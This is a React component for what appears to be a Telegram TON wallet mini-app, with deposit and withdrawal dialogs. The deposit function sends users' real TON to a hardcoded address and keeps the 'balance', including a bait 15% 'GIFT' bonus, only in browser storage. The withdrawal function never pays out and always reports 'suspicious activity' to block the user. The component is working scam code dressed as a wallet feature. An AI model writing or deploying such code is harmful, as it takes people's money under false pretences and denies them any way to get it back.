import { Plus, Minus, Wallet } from "lucide-react";
import { Button } from "@/components/ui/button";
import tonLogo from "@assets/toncoin_1760893904370.png";
import { useTelegramUser } from "@/hooks/use-telegram-user";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { useState, useEffect } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useToast } from "@/hooks/use-toast";
import { useTonConnectUI, useTonAddress, useTonWallet } from '@tonconnect/ui-react';

export default function TopHeader() {
  const { username, avatarLetter } = useTelegramUser();
  const { language, t } = useLanguage();
  const { toast } = useToast();
  const [tonConnectUI] = useTonConnectUI();
  const userFriendlyAddress = useTonAddress();
  const wallet = useTonWallet();
  const [isDepositOpen, setIsDepositOpen] = useState(false);
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [depositAmount, setDepositAmount] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [promoCode, setPromoCode] = useState("");
  const [balance, setBalance] = useState(0);
  const [depositAddress] = useState("UQAb0o8lRX_dZvl2NL6pInxbSjixvdrCf_G4KdqYRCgIjDz1");

  useEffect(() => {
    const savedBalance = localStorage.getItem('userBalance');
    if (savedBalance) {
      setBalance(parseFloat(savedBalance));
    }
  }, []);

  const handleDeposit = async () => {
    if (!wallet) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Подключите кошелёк TON" : "Connect TON wallet first",
        variant: "destructive",
      });
      tonConnectUI.openModal();
      return;
    }

    const amount = parseFloat(depositAmount);
    if (!amount || amount < 0.05) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Минимальная сумма депозита: 0.05 TON" : "Minimum deposit: 0.05 TON",
        variant: "destructive",
      });
      return;
    }

    let finalAmount = amount;
    let bonusApplied = false;
    if (promoCode.trim().toUpperCase() === "GIFT") {
      finalAmount = amount * 1.15;
      bonusApplied = true;
    }

    const amountInNanotons = Math.floor(amount * 1_000_000_000).toString();

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 360,
      messages: [
        {
          address: depositAddress,
          amount: amountInNanotons,
        }
      ]
    };

    try {
      const result = await tonConnectUI.sendTransaction(transaction);
      console.log('Transaction sent:', result);

      const newBalance = balance + finalAmount;
      setBalance(newBalance);
      localStorage.setItem('userBalance', newBalance.toString());

      if (bonusApplied) {
        toast({
          title: t.toast.success,
          description: `${amount} TON + 15% ${language === 'ru' ? 'бонус' : 'bonus'} = ${finalAmount.toFixed(2)} TON`,
        });
      } else {
        toast({
          title: t.toast.success,
          description: `${language === 'ru' ? 'Депозит успешно отправлен' : 'Deposit sent successfully'}: ${amount} TON`,
        });
      }

      setIsDepositOpen(false);
      setDepositAmount("");
      setPromoCode("");
    } catch (error) {
      console.error('Transaction failed:', error);
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Транзакция отменена или не удалась" : "Transaction cancelled or failed",
        variant: "destructive",
      });
    }
  };

  const handleWithdraw = () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount < 0.05) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Минимальная сумма вывода: 0.05 TON" : "Minimum withdrawal: 0.05 TON",
        variant: "destructive",
      });
      return;
    }

    toast({
      title: t.profile.suspiciousActivity,
      description: t.profile.withdrawalBlocked,
      variant: "destructive",
    });
    setIsWithdrawOpen(false);
    setWithdrawAmount("");
  };

  return (
    <>
      <header className="sticky top-0 z-50 flex items-center justify-between px-3 sm:px-4 py-3 sm:py-4 bg-background/95 backdrop-blur-sm">
        <div className="flex items-center gap-2 sm:gap-3" data-testid="text-title">
          <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
            <span className="text-sm sm:text-base font-bold text-white">{avatarLetter}</span>
          </div>
          <span className="text-base sm:text-lg font-semibold text-foreground">{username}</span>
        </div>

        <div className="flex items-center gap-2 sm:gap-3">
          {!wallet ? (
            <Button
              size="sm"
              onClick={() => tonConnectUI.openModal()}
              className="px-3 py-2 h-9 rounded-full bg-blue-600 hover:bg-blue-700 text-sm font-semibold gap-1.5 shadow-lg"
              data-testid="button-connect-wallet"
            >
              <Wallet className="w-4 h-4" />
              <span>{language === 'ru' ? 'Підключити' : 'Connect Wallet'}</span>
            </Button>
          ) : (
            <>
              <div className="flex items-center gap-1.5 sm:gap-2 px-2.5 sm:px-4 py-1.5 sm:py-2 rounded-full bg-primary/10 border border-primary/20" data-testid="display-balance">
                <img src={tonLogo} alt="TON" className="w-5 h-5 sm:w-6 sm:h-6 rounded-full object-cover" />
                <span className="text-xs sm:text-sm font-semibold text-foreground">{balance.toFixed(2)} TON</span>
              </div>
              <Button
                size="icon"
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-green-600 hover:bg-green-700 active-elevate-2 shadow-md"
                data-testid="button-deposit"
                onClick={() => setIsDepositOpen(true)}
              >
                <Plus className="w-4 h-4 text-white" />
              </Button>
              <Button
                size="icon"
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-red-600 hover:bg-red-700 active-elevate-2 shadow-md"
                data-testid="button-withdraw"
                onClick={() => setIsWithdrawOpen(true)}
              >
                <Minus className="w-4 h-4 text-white" />
              </Button>
            </>
          )}
        </div>
      </header>

      <Dialog open={isDepositOpen} onOpenChange={(open) => { if (open) setIsDepositOpen(true); }}>
        <DialogContent className="bg-gradient-to-b from-background to-muted/20 border border-green-500/20 rounded-[2rem] p-5 overflow-hidden max-w-[340px] shadow-2xl shadow-green-500/10" onInteractOutside={(e) => e.preventDefault()}>
          <div className="relative">
            <div className="absolute top-4 right-4">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => {
                  setIsDepositOpen(false);
                  setDepositAmount("");
                  setPromoCode("");
                }}
                className="w-8 h-8 rounded-full hover:bg-muted/50"
              >
                <span className="text-muted-foreground text-lg">×</span>
              </Button>
            </div>

            <div className="text-center mb-4">
              <div className="w-11 h-11 mx-auto mb-2 rounded-full bg-gradient-to-br from-green-500 to-emerald-500 flex items-center justify-center shadow-lg shadow-green-500/30">
                <Plus className="w-5 h-5 text-white" />
              </div>
              <DialogTitle className="text-foreground text-base font-bold mb-0.5">{t.profile.depositTitle}</DialogTitle>
              <p className="text-muted-foreground text-xs">{language === 'ru' ? 'Мінімум 0.05 TON' : 'Minimum 0.05 TON'}</p>
            </div>

            <div className="space-y-3">
              <div className="relative group">
                <div className="absolute inset-0 bg-gradient-to-r from-green-500/20 to-emerald-500/20 rounded-2xl blur-xl group-hover:blur-2xl transition-all duration-300"></div>
                <div className="relative bg-card/80 backdrop-blur-sm border border-green-500/30 rounded-2xl p-4 transition-all duration-300 group-hover:border-green-500/50">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-medium text-muted-foreground uppercase tracking-wide">
                      {language === 'ru' ? 'Сума' : 'Amount'}
                    </span>
                    <div className="flex items-center gap-2">
                      <img src={tonLogo} alt="TON" className="w-5 h-5 rounded-full" />
                      <span className="text-xs font-semibold text-foreground">TON</span>
                    </div>
                  </div>
                  <Input
                    type="number"
                    step="0.01"
                    min="0.05"
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(e.target.value)}
                    placeholder="0.00"
                    className="h-14 text-4xl font-bold text-center border-0 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 p-0"
                  />
                </div>
              </div>

              <div className="relative">
                <Input
                  type="text"
                  value={promoCode}
                  onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
                  placeholder={language === 'ru' ? 'Промокод' : 'Promo code'}
                  className="h-14 bg-card/50 backdrop-blur-sm border border-border/50 focus-visible:ring-2 focus-visible:ring-green-500/50 focus-visible:border-green-500/50 rounded-2xl text-center uppercase font-medium tracking-wider placeholder:text-muted-foreground/50"
                />
                {promoCode.toUpperCase() === "GIFT" && (
                  <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-green-500 text-white text-xs font-bold px-3 py-1 rounded-full shadow-lg animate-in fade-in slide-in-from-top-2 duration-300">
                    +15% бонус
                  </div>
                )}
              </div>

              <Button
                onClick={handleDeposit}
                className="w-full h-12 rounded-2xl bg-gradient-to-r from-green-600 via-green-500 to-emerald-500 hover:from-green-700 hover:via-green-600 hover:to-emerald-600 shadow-lg shadow-green-500/30 text-white font-bold text-sm transition-all duration-300 hover:shadow-xl hover:shadow-green-500/40 hover:scale-[1.02] active:scale-[0.98]"
              >
                {wallet ? t.profile.confirm : (language === 'ru' ? 'Підключити гаманець' : 'Connect Wallet')}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isWithdrawOpen} onOpenChange={(open) => { if (open) setIsWithdrawOpen(true); }}>
        <DialogContent className="bg-gradient-to-b from-background to-muted/20 border border-red-500/20 rounded-[2rem] p-5 overflow-hidden max-w-[340px] shadow-2xl shadow-red-500/10" onInteractOutside={(e) => e.preventDefault()}>
          <div className="relative">
            <div className="absolute top-4 right-4">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => {
                  setIsWithdrawOpen(false);
                  setWithdrawAmount("");
                }}
                className="w-8 h-8 rounded-full hover:bg-muted/50"
              >
                <span className="text-muted-foreground text-lg">×</span>
              </Button>
            </div>

            <div className="text-center mb-4">
              <div className="w-11 h-11 mx-auto mb-2 rounded-full bg-gradient-to-br from-red-500 to-orange-500 flex items-center justify-center shadow-lg shadow-red-500/30">
                <Minus className="w-5 h-5 text-white" />
              </div>
              <DialogTitle className="text-foreground text-base font-bold mb-0.5">{t.profile.withdrawTitle}</DialogTitle>
              <p className="text-muted-foreground text-xs">
                {language === 'ru' ? 'Доступно: ' : 'Available: '}
                <span className="font-semibold text-foreground">{balance.toFixed(2)} TON</span>
              </p>
            </div>

            <div className="space-y-3">
              <div className="relative group">
                <div className="absolute inset-0 bg-gradient-to-r from-red-500/20 to-orange-500/20 rounded-2xl blur-xl group-hover:blur-2xl transition-all duration-300"></div>
                <div className="relative bg-card/80 backdrop-blur-sm border border-red-500/30 rounded-2xl p-4 transition-all duration-300 group-hover:border-red-500/50">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-medium text-muted-foreground uppercase tracking-wide">
                      {language === 'ru' ? 'Сума' : 'Amount'}
                    </span>
                    <div className="flex items-center gap-2">
                      <img src={tonLogo} alt="TON" className="w-5 h-5 rounded-full" />
                      <span className="text-xs font-semibold text-foreground">TON</span>
                    </div>
                  </div>
                  <Input
                    type="number"
                    step="0.01"
                    min="0.05"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    placeholder="0.00"
                    className="h-14 text-3xl sm:text-4xl font-bold text-center border-0 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 px-2 py-0"
                  />
                </div>
              </div>

              <Button
                onClick={handleWithdraw}
                className="w-full h-12 rounded-2xl bg-gradient-to-r from-red-600 via-red-500 to-orange-500 hover:from-red-700 hover:via-red-600 hover:to-orange-600 shadow-lg shadow-red-500/30 text-white font-bold text-sm transition-all duration-300 hover:shadow-xl hover:shadow-red-500/40 hover:scale-[1.02] active:scale-[0.98]"
              >
                {t.profile.confirm}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}